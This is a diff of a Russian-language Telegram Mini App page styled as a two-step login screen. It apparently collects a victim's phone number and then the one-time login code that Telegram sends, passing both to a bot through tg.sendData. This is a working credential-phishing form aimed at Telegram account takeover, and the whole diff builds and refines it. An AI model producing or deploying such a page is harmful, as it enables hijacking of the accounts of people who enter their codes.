@@ -3,43 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- КРИТИЧЕСКИ ВАЖНО: Подключение скрипта Telegram -->
     <script src="https://telegram.org"></script>
     <style>
-        body { font-family: -apple-system, system-ui; background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .step { display: none; width: 90%; text-align: center; }
+        :root {
+            --bg: var(--tg-theme-bg-color, #ffffff);
+            --text: var(--tg-theme-text-color, #222222);
+            --btn: var(--tg-theme-button-color, #248bcf);
+            --btn-text: var(--tg-theme-button-text-color, #ffffff);
+        }
+        body {
+            font-family: -apple-system, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container { width: 85%; text-align: center; }
+        .step { display: none; }
         .active { display: block; }
-        input { width: 85%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid #ccc; font-size: 18px; outline: none; }
-        button { width: 90%; padding: 15px; border-radius: 12px; border: none; background: var(--tg-theme-button-color, #248bcf); color: var(--tg-theme-button-text-color, #fff); font-size: 16px; font-weight: bold; cursor: pointer; }
-        p { color: var(--tg-theme-hint-color, #999); font-size: 14px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 15px 0;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: none;
+            background-color: var(--btn);
+            color: var(--btn-text);
+            font-weight: bold;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
-    <!-- ШАГ 1: НОМЕР -->
-    <div id="step-p" class="step active">
-        <h2>Вход</h2>
-        <p>Введите номер телефона (можно без +)</p>
-        <input type="tel" id="phone" placeholder="79001234567">
-        <button onclick="send('phone')">Продолжить</button>
-    </div>
-    <!-- ШАГ 2: КОД -->
-    <div id="step-c" class="step">
-        <h2>Код из Telegram</h2>
-        <p>Введите код, который пришел в чат</p>
-        <input type="number" id="code" placeholder="12345">
-        <button onclick="send('code')">Подтвердить</button>
+
+    <div class="container">
+        <!-- Шаг 1: Ввод номера -->
+        <div id="step1" class="step active">
+            <h2>Вход</h2>
+            <p>Введите номер телефона</p>
+            <input type="tel" id="phone" placeholder="79001234567">
+            <button onclick="sendData('phone')">Продолжить</button>
+        </div>
+
+        <!-- Шаг 2: Ввод кода -->
+        <div id="step2" class="step">
+            <h2>Подтверждение</h2>
+            <p>Введите код из Telegram</p>
+            <input type="number" id="code" placeholder="12345">
+            <button onclick="sendData('code')">Войти</button>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
-        function send(type) {
-            const val = document.getElementById(type).value.trim();
-            if(!val) return;
-            tg.sendData(type + ":" + val);
-            if(type === 'phone') {
-                document.getElementById('step-p').classList.remove('active');
-                document.getElementById('step-c').classList.add('active');
-            } else { tg.close(); }
+        tg.expand(); // Разворачиваем приложение
+        tg.ready();
+
+        function sendData(type) {
+            const inputId = type === 'phone' ? 'phone' : 'code';
+            const value = document.getElementById(inputId).value.trim();
+
+            if (!value) {
+                tg.showAlert("Поле не может быть пустым!");
+                return;
+            }
+
+            try {
+                // Отправляем данные боту (формат phone:7999... или code:12345)
+                tg.sendData(type + ":" + value);
+                
+                if (type === 'phone') {
+                    // Переключаем визуально на ввод кода
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+                } else {
+                    // Закрываем после отправки кода
+                    tg.close();
+                }
+            } catch (e) {
+                // Если tg.sendData не сработал (приложение открыто не через KeyboardButton)
+                alert("Ошибка отправки: " + e.message + "\nУбедитесь, что открыли через кнопку в чате!");
+            }
         }
     </script>
 </body>
